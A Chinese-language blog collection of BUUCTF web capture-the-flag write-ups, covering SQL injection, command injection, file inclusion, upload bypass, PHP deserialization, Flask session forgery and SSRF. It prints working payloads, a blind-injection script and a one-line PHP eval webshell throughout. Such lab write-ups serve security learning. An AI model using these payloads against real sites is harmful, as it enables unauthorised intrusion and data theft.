---
title: BUUCTF
categories: ctf题目
---

# [HCTF 2018]WarmUp
- **考点**  ：代码审计

看源码，跳转source.php

代码审计

---
# [极客大挑战 2019]EasySQL
输入 用户：`'`  密码：admin

万能密码直接过.


---

<!--more-->

---
# [强网杯 2019]随便注
- **考点** ：handler语法

[三种解法](https://www.jianshu.com/p/36f0772f5ce8)

`1’` 报错

![](https://img-blog.csdnimg.cn/20210422161738508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

```
1' or 1=1#
```

![](https://img-blog.csdnimg.cn/2021042216175826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
返回过滤代码：

![](https://img-blog.csdnimg.cn/20210422161855374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

过滤select的话考虑堆叠注入

```
1';show databases;#
```
![](https://img-blog.csdnimg.cn/20210422161920517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
```
查表：1';show tables;#

查列：1';show columns from `1919810931114514`;#
```

使用handler语句
```
1';handler `1919810931114514` open;handler `1919810931114514` read first#
```

>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中

---
# [极客大挑战 2019]Havefun
![](https://img-blog.csdnimg.cn/20210422162038249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# [SUCTF 2019]EasySQL
- 考点：调整 mysql 模式

![](https://img-blog.csdnimg.cn/20210422162216437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

堆叠注入：

![](https://img-blog.csdnimg.cn/20210422162221922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

过滤from

牛年ctf，哎还得再看看啊

![](https://img-blog.csdnimg.cn/2021042216234360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
还有一个非预期解：`*,1`

---
# [ACTF2020 新生赛]Include
- 考点：php伪协议

![](https://img-blog.csdnimg.cn/2021042216245032.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
看到 file，直接/etc/passwd 回显，然后直接伪协议

![](https://img-blog.csdnimg.cn/20210422162519382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# [极客大挑战 2019]Secret File

![](https://img-blog.csdnimg.cn/20210422162613815.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

查看网页源码跳转抓包：

![](https://img-blog.csdnimg.cn/20210422162636962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
访问代码审计：
```php
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
```
php://filter直接过

---
# [极客大挑战 2019]LoveSQL

万能密码直接进：

![](https://img-blog.csdnimg.cn/20210422162738321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

联合注入直接蒙出来字段数为3：回显

![](https://img-blog.csdnimg.cn/20210422162804627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
```
表名：
'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='geekuser'#

列名：
'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='geekuser'#

查字段：
'union select 1,group_concat(password),3 from l0ve1ysq1#
```

---
# [ACTF2020 新生赛]Exec
Payload：
```
;cat /flag;
```




---
# [GXYCTF2019]Ping Ping Ping

- 考点：命令执行

![](https://img-blog.csdnimg.cn/20210422162916392.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

获得index.php:
```php
/?ip=
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "
";
  print_r($a);
}

?>
```
过滤了flag，空格

空格绕过：
```
{cat,flag.txt}
cat${IFS}flag.txt
cat$IFS$9flag.txt
cat<flag.txt
cat<>flag.txt
```
可以看命令执行绕过 黑名单绕过

[命令执行](http://www.yongsheng.site/2021/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/)

payload:
```
?ip=;a=g;cat$IFS$3fla$a.php
```

---
# [极客大挑战 2019]Knife
直接蚁剑连接

---
# *[护网杯 2018]easy_tornado（hash加密）
- 考点： Tornado

![](https://img-blog.csdnimg.cn/20210422163525677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
分别是：
>flag in /fllllllllllllag
render
md5(cookie_secret+md5(filename))


需要构造url内容是：
```
file?filename=/flllllllag&filehash=xxxxxxxx

filehash= md5(cookie_secret+md5(/fllllllllag))
```

网上搜 Tornado render payload：

![](https://img-blog.csdnimg.cn/20210422163643686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
拿到 cookie_secret:  a8c9da8f-0f16-456e-bd0c-41949deab23e

计算hash脚本：
```python
import hashlib

filename = '/fllllllllllllag'
cookie_secret ="a8c9da8f-0f16-456e-bd0c-41949deab23e"

def getvalue(string):
    md5 = hashlib.md5()
    md5.update(string.encode('utf-8'))
    return md5.hexdigest()

def merge():
    print(getvalue(cookie_secret + getvalue(filename)))

merge()
```

---
# *[RoarCTF 2019]Easy Calc（php解析特性）
- 考点： php解析特性

访问calc.php 可以看到源码
```php
<?php 
error_reporting(0); 
if(!isset($_GET['num'])){ 
    show_source(__FILE__); 
}else{ 
        $str = $_GET['num']; 
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^']; 
        foreach ($blacklist as $blackitem) { 
                if (preg_match('/' . $blackitem . '/m', $str)) { 
                        die("what are you want to do?"); 
                } 
        } 
        eval('echo '.$str.';'); 
} 
?>
```

假如 waf 不允许 num 变量传递字母，可以在`num前加个空格`，这样 waf 就找不到 `num` 这个变量了，因为现在的变量叫` "       num"`，而不是 `num`。但 `php在解析的时候`，`会先把空格给去掉`，这样我们的代码还能正常运行，还上传了非法字符。


Payload1：
```
?  num=eval(end(current(get_defined_vars())));&b=show_source('/f1agg');  
Payload2：
?  num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
```


>get_defined_vars ：此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。

>current ：返回数组中的当前单元

>end ：将数组的内部指针指向最后一个单元 

>chr ：返回指定的字符


---
# [极客大挑战 2019]Http
网页源码发现Secret.php

修改Referer，UA，XFF


---
# [极客大挑战 2019]PHP
- 考点：反序列化不可见字符处理
- 考点：反序列化漏洞绕过__wakeup 

提示备份，www.zip

```php
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
```



当 `php>7.1`时可以将 private换成 public

这题不行，不可见字符处添加%00
或大写S 加 \00

绕过__wakeup将`说明的参数个数大于实际的参数个数`

PAYLOAD:
```
O:4:"Name":3:{S:14:"\00Name\00username";S:5:"admin";S:14:"\00Name\00password";i:100;}  

O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
```

---
# [极客大挑战 2019]Upload
- 考点：文件上传绕过
- 考点：php其他后缀

过滤 `?`  短标签绕过 `<script language="php">eval($_POST[shell]);</script>`

检查内容 添加 `GIF89A`

修改后缀 phtml 常见修改：`php,php3,php4,php5,phtml.pht ,phps`

上传成功，直接去upload目录，蚁剑连接

---
# [极客大挑战 2019]BabySQL

- 考点： SQL 注入双写绕过

可以看到 or被替换为空了，双写试试：

![](https://img-blog.csdnimg.cn/20210422164954762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
绕过：

![](https://img-blog.csdnimg.cn/20210422165006349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
union,select 同理

```
ununionion seselectlect 1,2,3 %23

过滤了from or where：
ununionion seselectlect 1,group_concat(schema_name),3 frfromom infoorrmation_schema.schemata%23

ununionion seselectlect 1,group_concat(table_name),3 frfromom infoorrmation_schema.tables whewherere table_schema=’ctf’ %23

ununionion seselectlect 1,group_concat(column_name),3 frfromom infoorrmation_schema.columns whewherere table_name=’Flag’ %23

ununionion seselectlect 1,flag ,3 frfromom (ctf.Flag) %23 //另外的库和表名这样读取
```

---
# [ACTF2020 新生赛]Upload
上传，改后缀phtml phps

---
# [BackupFile]
源码泄露，dirsearch 扫到index.php.bak
Php弱比较


---
# [HCTF 2018]admin
- 考点：flask-session

正常注册，更改密码:

![](https://img-blog.csdnimg.cn/20210422165313448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
网页源码看到一个地址：https://github.com/woadsl1234/hctf_flask/

而且更改密码抓包时看到`cookie`，确定是flask-cookie的题目

直接 `flask-unsign` 解出来：

![](https://img-blog.csdnimg.cn/20210422165410158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
>{'_fresh': True, '_id': b'9b087703ee2a69aedd6725ee7da816ecc07e14b588ff5de45674d2327dca47bdbf79c00729781c416cada142886a3ea467a9f069eaf9841ee1b47e58b6a84ad1', 'csrf_token': b'7462092b7cf1fa7f946709c5d34cb40747a2b2a2', 'image': b'zh4E', 'name': '123', 'user_id': '10'}


想`伪造 session` 可以暴力破解 `密钥`

用的默认字典失败

![](https://img-blog.csdnimg.cn/20210422165508670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

去网址

找到secrect-key

![](https://img-blog.csdnimg.cn/20210422165525617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
加密伪造：

![](https://img-blog.csdnimg.cn/20210422165542701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

覆盖原先session：

![](https://img-blog.csdnimg.cn/20210422165606342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# [极客大挑战 2019]BuyFlag
- 考点：php 科学计数法

正常进入：

![](https://img-blog.csdnimg.cn/20210422165805182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
网页源码 `password弱比较` 且设置user=1；

![](https://img-blog.csdnimg.cn/20210422165832722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

![](https://img-blog.csdnimg.cn/20210422165847458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

买 flag 的话肯定是比较了：

php科学计数法表示数字：
```
1.12E8
1e9
```

另外解：

>数组绕过money[]=1  (PHP 5.3.5，老版本PHP，要求我们不能输入8位字符，而输入其他任何字符都会返回you have not enough money,loser~，合理猜测一下用的是strcmp，那么直接money[]=1就可以了)

---
# *[BJDCTF2020]Easy MD5
- 考点：sql+md5


就给个框，看题目是输入md5

![](https://img-blog.csdnimg.cn/20210422170237546.png#pic_center)

抓包看到返回值：有一条sql语句：

![](https://img-blog.csdnimg.cn/20210422170249178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
直接： `ffifdyop` 或 129581926211651571912466741651878684928

md5函数在指定了 `true` 的时候，是返回的`原始 16 字符二进制格式`。也就是说会返回这样子的字符串：`'or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c`

拼接后是永真的

发送页面跳转，md5用数组绕过

---
# [SUCTF 2019]CheckIn
- 考点：.user.ini

文件上传题目

正常上传图片马成功

冰蝎，哥斯拉都不行，但是看到返回时有`index.php`   (这里是暗示)

上传.user.ini 指向1.png


![](https://img-blog.csdnimg.cn/2021042217065915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

上传图片马

---
# [ZJCTF 2019]NiZhuanSiWei
- 考点：php 伪协议的灵活利用


```php
<?php   
$text = $_GET["text"]; 
$file = $_GET["file"]; 
$password = $_GET["password"]; 
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){ 
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>"; 
    if(preg_match("/flag/",$file)){ 
        echo "Not now!"; 
        exit();  
    }else{ 
        include($file);  //useless.php 
        $password = unserialize($password); 
        echo $password; 
    } 
} 
else{ 
    highlight_file(__FILE__); 
} 
?>

```

>text可以用 php://input绕过
file 可以用 php://filter/ 读取useless.php

useless.php:

```php
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

注：public $file="flag.php";


---
# *[极客大挑战 2019]HardSQL

- 考点：报错注入

```
'or(updatexml(1,concat(0x26,database(),0x26),1))%23&password=1

'or(updatexml(1,concat(0x26,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(“geek”)),0x26),1))%23&password=1

'or(updatexml(1,concat(0x26,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(“H4rDsq1”)),0x26),1))%23&password=1

'or(updatexml(1,concat(0x26,(select(password)from(H4rDsq1)),0x26),1))%23&password=1
```

![](https://img-blog.csdnimg.cn/20210422171341414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
只报了一半
这里学到新方法:

substring与mid被过滤可以用 `right与 left`来绕过

>'or(updatexml(1,concat(0x26,(select(right(password,35))from(H4rDsq1)),0x26),1))%23&password=1

>其中 right或者left  ，35可以是其他长度


---
# *[CISCN2019 华北赛区 Day2 Web1]Hack World

- 考点：if 三目运算 盲注脚本

给了表和列：

![](https://img-blog.csdnimg.cn/2021042217161069.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
开局一个框，经过测试，只有两句话

Hello, glzjin wants a girlfriend.
Do you want to be my girlfriend?

应该是盲注

`If语句`：IF 表达式
```
 IF( expr1 , expr2 , expr3 )
 expr1 的值为 TRUE，则返回值为 expr2 
 expr1 的值为FALSE，则返回值为 expr3
```

![](https://img-blog.csdnimg.cn/20210422171719772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)


那也就是判断条件我们是可控的：

payload：
```
id=if(ascii(substr((select(flag)from(flag)),1,1))=102,1,2)
```
如果为真就返回 Hello, glzjin wants a girlfriend.

写个脚本跑一下：

```python
import requests

url='http://82d7b211-c877-4380-a07d-38a2fb1db493.node3.buuoj.cn/index.php'
asc_str = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_"
flag=''
for i in range(50):
    for j in asc_str:
        data={"id":"if(ascii(substr((select(flag)from(flag)),{},1))=ascii('{}'),1,2)" .format(i,j)}
        c=requests.post(url,data)
        if 'Hello' in c.text:
            flag+=j
            print(flag)
```

二分法脚本：

```python
import requests
import time

url = "http://be7c3bbe-f847-4c30-bfbd-baa005a54773.node3.buuoj.cn/index.php"
payload = {
   "id" : ""
}
result = ""
for i in range(1,100):
   l = 33
   r =130
   mid = (l+r)>>1
   while(l<r):
      payload["id"] = "0^" + "(ascii(substr((select(flag)from(flag)),{0},1))>{1})".format(i,mid)
      html = requests.post(url,data=payload)
      print(payload)
      if "Hello" in html.text:
         l = mid+1
      else:
         r = mid
      mid = (l+r)>>1
   if(chr(mid)==" "):
      break
   result = result + chr(mid)
   print(result)
print("flag: " ,result)

```


---
# *[网鼎杯 2018]Fakebook
- 考点：sql 读文件
- 考点：ssrf 读文件+反序列化

注册进来后修改url

![](https://img-blog.csdnimg.cn/20210422172023701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
发现是个sql，整型注入


Sql做法：

注册进入后，查询不存在的用户：

![](https://img-blog.csdnimg.cn/20210422172124933.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

No这里可能存在sql   sqlmap没梭进去

Order by 得到有4字段

整型注入：

![](https://img-blog.csdnimg.cn/20210422172214513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
空格替换：++   /**/

![](https://img-blog.csdnimg.cn/20210422172230311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

`
-1++union++select++1,user(),3,4#`

查询到当前用户为root用户

![](https://img-blog.csdnimg.cn/20210422172320895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
非预期：
mysql中的 `load_file`函数，允许访问系统文件，并将内容以字符串形式返回，不过`需要的权限很高`，且函数参数`要求文件的绝对路径`。

这里我们已经在上面看到了很多绝对路径了，非常的常规：/var/www/html/猜测一波flag的文件名flag.php

Payload：
```
-1++union++select++1,load_file("/var/www/html/flag.php"),3,4#
```
查看源码即可

SSRF预期解：

Robotx.txt 发现 user.php.bak备份文件

```php
<?php
class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

在之前的 sql查询中会发现`反序列化函数`

![](https://img-blog.csdnimg.cn/20210422174235379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
当查询fakebook库users表后出现字段：`no,username,passwd,data`

当查询 data 时 发现反序列化的字段
可见 data 与blog有关系，`即data字段经过反序列化在blog显示`

将`得到的 data`传入联合查询`第四列`的返回结果
```
?no=1/**/union/**/select/**/1,2,3,%27O:8:%22UserInfo%22:3:{s:4:%22name%22;s:5:%22admin%22;s:3:%22age%22;i:123;s:4:%22blog%22;s:13:%22www.baidu.com%22;}%27%23
```
发现可以成功解析:

![](https://img-blog.csdnimg.cn/20210422174420884.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

结合user.php

这边get传入的就是用户信息中的blog地址，如果不是404就会将内容读出来。

存在ssrf文件读取

payload:
```php
<?php
class UserInfo
{
    public $name = "1";
    public $age = 1;
    public $blog = "file:///var/www/html/flag.php";
}
$a = new UserInfo();
echo serialize($a);
?>
```

传入第四列查询：

![](https://img-blog.csdnimg.cn/2021042217452573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
成功解析，查看源码即可

---
# **[GXYCTF2019]BabySQli
- 考点：联合查询-虚拟数据

查看网页源码，发现 search.php，再查看源码发现一串base编码

Base32-64解出来：

>select * from user where username = '$name'

过滤or，(), =  `Or` 绕过

name=admin'Order by 3#&pw=1
查的字段数为`3`

Sqlmap跑出来密码明显是加密的md5

![](https://img-blog.csdnimg.cn/20210422175528404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

说明用户输入的密码的md5与库中的md5对比，相同则认证

本题考点：`联合查询所查询的数据不存在时，联合查询会构造一个虚拟的数据`

联合注入：
>'union select 'admin',2,3#   //返回wrong user

>'union select 1,'admin',3#  //返回wrong pass

说明了admin在第二字段

![](https://img-blog.csdnimg.cn/20210422175812503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
**`重点`**：联合查询所查询的数据不存在时，联合查询会构造一个虚拟的数据

可以看到当联合查询一个不存在的值时，会出现一个构造的虚拟数据

![](https://img-blog.csdnimg.cn/20210422175902546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

那么我们这样构造：
```
name='union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#&pw=123456
```
此时我们传进去的正是123456的md5值，因此比对成功（因为e10adc39...不存在，如上图）

---
# [网鼎杯 2020 青龙组]AreUSerialz
- 考点：反序列化不可见字符处理

写过

---
# [MRCTF2020]你传你🐎呢
- .htaccess 绕过

正常过滤php等一系列，想着.user.ini但是没有index.php

又想着试试.htaccess 也被ban

`修改Content-Type为image/jpeg`，即可成功上传

再上传图片马，蚁剑

![](https://img-blog.csdnimg.cn/20210422180333211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# [MRCTF2020]Ez_bypass
?id[]=1&gg[]=2
Post：passwd=1234567abc

---
# [GYCTF2020]Blacklist
就是随便注那题

payload:
```
1';show columns from `FlagHere`#
1';handler `FlagHere` open;handler `FlagHere` read first;#
```
